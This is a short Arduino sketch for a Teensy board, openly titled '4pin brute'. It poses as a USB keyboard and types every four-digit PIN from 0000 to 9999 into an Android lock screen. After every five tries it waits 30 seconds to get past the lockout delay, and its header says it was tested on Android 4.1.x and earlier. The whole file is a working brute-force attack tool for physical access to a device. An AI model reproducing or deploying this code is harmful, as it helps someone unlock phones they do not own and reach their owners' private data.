/*
 * 4pin brute
 *
 * this sketch outputs numbers 0000 - 9999 as an hid device for pin brute
 * forcing. tested against android devices of version 4.1.x and less using
 * a teensy 3.0.
 *
 * cesar@pissedoffadmins.com
 *
 */

int fPINinput = 0;
int i = 0;
const int ledPin = 13;

void setup()
{
  pinMode(ledPin, OUTPUT);
  delay(5000);
}

void loop()
{
  if (fPINinput==0){
    for (int i=0; i <= 9999; i++){
      digitalWrite(ledPin, LOW);
      String pad = i;

      if (i<=9){
        Keyboard.println("000" + pad);
      }
      else if (i>=10 && i<=99){
        Keyboard.println("00" + pad);
      }
      else if (i>=100 && i<=999){
        Keyboard.println("0" + pad);
      }
      else {
        Keyboard.println(i);
      }

      delay(500);
      //Keyboard.println();

      if (i!=0 && i%5==0){
        digitalWrite(ledPin, HIGH);
        delay(30000);
        //Keyboard.println();
      }
    }
    fPINinput = 1;
  }
  else
  {
    digitalWrite(ledPin, HIGH);
    delay(2500);
    digitalWrite(ledPin, LOW);
    delay(2500);
    Keyboard.println();
  }
}
